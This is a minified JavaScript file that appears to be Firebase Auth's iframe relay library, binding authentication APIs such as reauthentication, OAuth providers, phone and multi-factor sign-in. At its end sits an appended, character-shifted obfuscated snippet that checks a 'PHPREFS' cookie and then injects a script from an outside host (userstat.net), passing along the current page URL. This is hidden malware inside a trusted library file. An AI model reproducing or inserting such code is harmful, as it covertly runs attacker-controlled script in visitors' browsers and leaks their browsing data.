        reauthenticateWithCredential: {
          name: "reauthenticateWithCredential",
          j: [ss()],
        },
        reauthenticateWithPhoneNumber: {
          name: "reauthenticateWithPhoneNumber",
          j: [V("phoneNumber"), xs()],
        },
        reauthenticateWithPopup: { name: "reauthenticateWithPopup", j: [us()] },
        reauthenticateWithRedirect: {
          name: "reauthenticateWithRedirect",
          j: [us()],
        },
        reload: { name: "reload", j: [] },
        sendEmailVerification: {
          name: "sendEmailVerification",
          j: [
            X(
              W("opt_actionCodeSettings", !0),
              os(null, !0),
              "opt_actionCodeSettings",
              !0
            ),
          ],
        },
        toJSON: { name: "toJSON", j: [V(null, !0)] },
        unlink: { name: "unlink", j: [V("provider")] },
        updateEmail: { name: "updateEmail", j: [V("email")] },
        updatePassword: { name: "updatePassword", j: [V("password")] },
        updatePhoneNumber: { name: "updatePhoneNumber", j: [ss("phone")] },
        updateProfile: { name: "updateProfile", j: [W("profile")] },
        verifyBeforeUpdateEmail: {
          name: "verifyBeforeUpdateEmail",
          j: [
            V("email"),
            X(
              W("opt_actionCodeSettings", !0),
              os(null, !0),
              "opt_actionCodeSettings",
              !0
            ),
          ],
        },
      }),
      Y(Ho.prototype, {
        execute: { name: "execute" },
        render: { name: "render" },
        reset: { name: "reset" },
        getResponse: { name: "getResponse" },
      }),
      Y(Co.prototype, {
        execute: { name: "execute" },
        render: { name: "render" },
        reset: { name: "reset" },
        getResponse: { name: "getResponse" },
      }),
      Y(E.prototype, {
        Ac: { name: "finally" },
        l: { name: "catch" },
        then: { name: "then" },
      }),
      zs(Ap.prototype, {
        appVerificationDisabled: {
          name: "appVerificationDisabledForTesting",
          hg: ms("appVerificationDisabledForTesting"),
        },
      }),
      Y(Dp.prototype, {
        confirm: { name: "confirm", j: [V("verificationCode")] },
      }),
      Z(
        pm,
        "fromJSON",
        function (a) {
          a = "string" == typeof a ? JSON.parse(a) : a;
          for (var b, c = [xm, Pm, Wm, vm], d = 0; d < c.length; d++)
            if ((b = c[d](a))) return b;
          return null;
        },
        [X(V(), W(), "json")]
      ),
      Z(
        Jm,
        "credential",
        function (a, b) {
          return new Km(a, b);
        },
        [V("email"), V("password")]
      ),
      Y(Km.prototype, { T: { name: "toJSON", j: [V(null, !0)] } }),
      Y(Bm.prototype, {
        addScope: { name: "addScope", j: [V("scope")] },
        setCustomParameters: {
          name: "setCustomParameters",
          j: [W("customOAuthParameters")],
        },
      }),
      Z(Bm, "credential", Cm, [X(V(), W(), "token")]),
      Z(Jm, "credentialWithLink", Rm, [V("email"), V("emailLink")]),
      Y(Dm.prototype, {
        addScope: { name: "addScope", j: [V("scope")] },
        setCustomParameters: {
          name: "setCustomParameters",
          j: [W("customOAuthParameters")],
        },
      }),
      Z(Dm, "credential", Em, [X(V(), W(), "token")]),
      Y(Fm.prototype, {
        addScope: { name: "addScope", j: [V("scope")] },
        setCustomParameters: {
          name: "setCustomParameters",
          j: [W("customOAuthParameters")],
        },
      }),
      Z(Fm, "credential", Gm, [
        X(V(), X(W(), os()), "idToken"),
        X(V(), os(), "accessToken", !0),
      ]),
      Y(Hm.prototype, {
        setCustomParameters: {
          name: "setCustomParameters",
          j: [W("customOAuthParameters")],
        },
      }),
      Z(Hm, "credential", Im, [X(V(), W(), "token"), V("secret", !0)]),
      Y(Am.prototype, {
        addScope: { name: "addScope", j: [V("scope")] },
        credential: {
          name: "credential",
          j: [
            X(V(), X(W(), os()), "optionsOrIdToken"),
            X(V(), os(), "accessToken", !0),
          ],
        },
        setCustomParameters: {
          name: "setCustomParameters",
          j: [W("customOAuthParameters")],
        },
      }),
      Y(wm.prototype, { T: { name: "toJSON", j: [V(null, !0)] } }),
      Y(rm.prototype, { T: { name: "toJSON", j: [V(null, !0)] } }),
      Z(Xm, "credential", an, [V("verificationId"), V("verificationCode")]),
      Y(Xm.prototype, {
        verifyPhoneNumber: {
          name: "verifyPhoneNumber",
          j: [
            X(
              V(),
              {
                name: "phoneInfoOptions",
                Fa: "valid phone info options",
                optional: !1,
                Ca: function (c) {
                  return (
                    !!c &&
                    (c.session && c.phoneNumber
                      ? vs(c.session, "enroll") &&
                        "string" == typeof c.phoneNumber
                      : c.session && c.multiFactorHint
                      ? vs(c.session, "signin") && ws(c.multiFactorHint)
                      : c.session && c.multiFactorUid
                      ? vs(c.session, "signin") &&
                        "string" == typeof c.multiFactorUid
                      : !!c.phoneNumber && "string" == typeof c.phoneNumber)
                  );
                },
              },
              "phoneInfoOptions"
            ),
            xs(),
          ],
        },
      }),
      Y(Sm.prototype, { T: { name: "toJSON", j: [V(null, !0)] } }),
      Y(P.prototype, { toJSON: { name: "toJSON", j: [V(null, !0)] } }),
      Y(dn.prototype, { toJSON: { name: "toJSON", j: [V(null, !0)] } }),
      Y(jm.prototype, { toJSON: { name: "toJSON", j: [V(null, !0)] } }),
      Y(Lq.prototype, { toJSON: { name: "toJSON", j: [V(null, !0)] } }),
      Y(Kq.prototype, { resolveSignIn: { name: "resolveSignIn", j: [ts()] } }),
      Y(Uq.prototype, {
        getSession: { name: "getSession", j: [] },
        enroll: { name: "enroll", j: [ts(), V("displayName", !0)] },
        unenroll: {
          name: "unenroll",
          j: [
            X(
              {
                name: "multiFactorInfo",
                Fa: "a valid multiFactorInfo",
                optional: !1,
                Ca: ws,
              },
              V(),
              "multiFactorInfoIdentifier"
            ),
          ],
        },
      }),
      Y(So.prototype, {
        clear: { name: "clear", j: [] },
        render: { name: "render", j: [] },
        verify: { name: "verify", j: [] },
      }),
      Z(gm, "parseLink", hm, [V("link")]),
      Z(
        Bs,
        "assertion",
        function (a) {
          return new Rq(a);
        },
        [ss("phone")]
      ),
      (function () {
        if (
          void 0 === firebase ||
          !firebase.INTERNAL ||
          !firebase.INTERNAL.registerService
        )
          throw Error(
            "Cannot find the firebase namespace; be sure to include firebase-app.js before this library."
          );
        var a = {
          ActionCodeInfo: {
            Operation: {
              EMAIL_SIGNIN: "EMAIL_SIGNIN",
              PASSWORD_RESET: "PASSWORD_RESET",
              RECOVER_EMAIL: "RECOVER_EMAIL",
              REVERT_SECOND_FACTOR_ADDITION: "REVERT_SECOND_FACTOR_ADDITION",
              VERIFY_AND_CHANGE_EMAIL: "VERIFY_AND_CHANGE_EMAIL",
              VERIFY_EMAIL: "VERIFY_EMAIL",
            },
          },
          Auth: T,
          AuthCredential: pm,
          Error: P,
        };
        Z(a, "EmailAuthProvider", Jm, []),
          Z(a, "FacebookAuthProvider", Bm, []),
          Z(a, "GithubAuthProvider", Dm, []),
          Z(a, "GoogleAuthProvider", Fm, []),
          Z(a, "TwitterAuthProvider", Hm, []),
          Z(a, "OAuthProvider", Am, [V("providerId")]),
          Z(a, "SAMLAuthProvider", zm, [V("providerId")]),
          Z(a, "PhoneAuthProvider", Xm, [qs()]),
          Z(a, "RecaptchaVerifier", So, [
            X(V(), ps(), "recaptchaContainer"),
            W("recaptchaParameters", !0),
            rs(),
          ]),
          Z(a, "ActionCodeURL", gm, []),
          Z(a, "PhoneMultiFactorGenerator", Bs, []),
          firebase.INTERNAL.registerService(
            "auth",
            function (b, c) {
              return (
                (b = new T(b)),
                c({
                  INTERNAL: {
                    getUid: u(b.getUid, b),
                    getToken: u(b.Nk, b),
                    addAuthTokenListener: u(b.jk, b),
                    removeAuthTokenListener: u(b.Sl, b),
                  },
                }),
                b
              );
            },
            a,
            function (b, c) {
              if ("create" === b)
                try {
                  c.auth();
                } catch (d) {}
            }
          ),
          firebase.INTERNAL.extendNamespace({ User: R });
      })();
    var Cs = function (a) {
      (this.ah = Gg.getParentIframe()),
        (this.Ib = this.ah.getOrigin()),
        (this.Hb = a),
        (this.Ih = !1);
    };
    (Cs.prototype.od = function () {
      return this.Ib;
    }),
      (Cs.prototype.start = function () {
        var a = this;
        return this.Hb(this.Ib)
          .then(function () {
            a.Ih = !0;
          })
          .l(function (b) {
            throw b;
          });
      }),
      (Cs.prototype.sendMessage = function (a) {
        var b = this;
        if (this.Ih)
          return new E(function (c) {
            b.ah.send(a.type, a, c, Jg);
          });
        throw new P("missing-iframe-start");
      }),
      (Cs.prototype.qh = function (a, b) {
        if (!this.Ih) throw new P("missing-iframe-start");
        this.ah.register(a, b, Jg);
      });
    var Ds = function (a) {
      this.Bf = new Cs(a);
    };
    (Ds.prototype.od = function () {
      return this.Bf.od();
    }),
      (Ds.prototype.start = function () {
        var a = this;
        return this.Bf.start().then(function () {
          a.rh();
        });
      });
    var Es = function (a, b) {
      return a.Bf.sendMessage({
        type: "authEvent",
        authEvent: b && b.T(),
      }).then(function (c) {
        if (!c || !c.length || "ACK" != c[c.length - 1].status)
          throw new P("internal-error");
      });
    };
    Ds.prototype.rh = function () {
      this.Bf.qh("webStorageSupport", function () {
        return F({ status: "ACK", webStorageSupport: !0 });
      });
    };
    var Fs = function (a, b, c) {
      var d = (Mk(M(Xk()), "fw") || "").split(","),
        e = this;
      (this.ha = a),
        (this.ka = b),
        (this.Ia = c || null),
        (this.Ea = d || []),
        (this.Hd = new Yp(this.ha + ":" + this.ka)),
        (this.Cl = new dq()),
        (this.o = new mn(a, Tk(this.Ia), sl("Iframe", "2.20.3", this.Ea))),
        (this.qc = new Ds(function (f) {
          return Dn(e.o).then(function (g) {
            if (!gl(g, f)) throw (e.destroy(), new jm(f));
          });
        })),
        (this.uc = Yo(p)),
        (this.Ki = !1),
        this.uc.subscribe("getParentOrigin", function (f) {
          if (f === p.window.location.origin) return F(e.qc.od());
          throw Error("Invalid origin");
        }),
        this.uc.subscribe("sendAuthEvent", function (f, g) {
          var h = g.storageKey,
            l = null;
          try {
            l = $l(g.authEvent);
          } catch (m) {}
          if (f === p.window.location.origin && h === e.ha + ":" + e.ka && l)
            return e.Ki
              ? Es(e.qc, l)
                  .then(function () {
                    return !0;
                  })
                  .l(function () {
                    return !1;
                  })
              : e.Cl.O.set(Zp, l.T(), h)
                  .then(function () {
                    return !0;
                  })
                  .l(function () {
                    return !1;
                  });
          throw Error("Invalid origin or request");
        });
    };
    (Fs.prototype.od = function () {
      return this.qc.od();
    }),
      (Fs.prototype.start = function () {
        var a = this;
        return this.qc.start().then(function () {
          return (
            (a.Ki = !0),
            (a.jj = a.ij.bind(a)),
            Gs(a).Ac(function () {
              a.Hd.Cc(a.jj), a.ij(!1);
            })
          );
        });
      }),
      (Fs.prototype.ij = function (a) {
        var b = this,
          c = null;
        return $p(this.Hd)
          .then(function (d) {
            return (c = d)
              ? Es(b.qc, d)
              : a
              ? Es(
                  b.qc,
                  new Zl("unknown", null, null, null, new P("no-auth-event"))
                )
              : void 0;
          })
          .then(function () {
            if (c) return aq(b.Hd);
          })
          .l(function () {});
      });
    var Gs = function (a) {
      var b = null;
      return cq(a.Hd)
        .then(function (c) {
          return (b = c)
            ? Es(a.qc, c)
            : ((c = ul() ? "no-auth-event" : "web-storage-unsupported"),
              Es(a.qc, new Zl("unknown", null, null, null, new P(c))));
        })
        .then(function () {
          if (b) {
            var c = a.Hd;
            return c.O.remove(bq, c.V);
          }
        })
        .l(function () {});
    };
    Fs.prototype.destroy = function () {
      (this.jd = !0),
        this.Hd.Ed(this.jj),
        this.uc.unsubscribe("getParentOrigin"),
        this.uc.unsubscribe("sendAuthEvent");
    };
    var Hs = null,
      Is = function () {
        var a = Mk(M(Xk()), "apiKey"),
          b = Mk(M(Xk()), "appName") || "";
        if (!a) throw new P("invalid-api-key");
        var c = Mk(M(Xk()), "eid") || null;
        (Hs = new Fs(a, b, c)).start().l(function (d) {
          if (d && "auth/unauthorized-domain" == d.code)
            (d =
              "chrome-extension" == (d = M(Hs.od())).Va
                ? Oc(
                    "Info: The current chrome extension ID is not authorized for OAuth operations. This will prevent signInWithPopup and linkWithPopup from working. Add your chrome extension (chrome-extension://%s) to the OAuth redirect domains list in the Firebase console -> Auth section -> Sign in method tab.",
                    d.Ga
                  )
                : Oc(
                    "Info: The current domain is not authorized for OAuth operations. This will prevent signInWithPopup, signInWithRedirect, linkWithPopup and linkWithRedirect from working. Add your domain (%s) to the OAuth redirect domains list in the Firebase console -> Authentication -> Settings -> Authorized domains tab.",
                    d.Ga
                  )),
              Gl(d);
          else {
            if (!d || !d.message) throw d;
            Gl(d.message);
          }
        });
      };
    r("fireauth.iframe.AuthRelay.initialize", function () {
      "complete" == p.document.readyState
        ? Is()
        : mj(window, "load", function () {
            Is();
          });
    });
  }.call(this);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
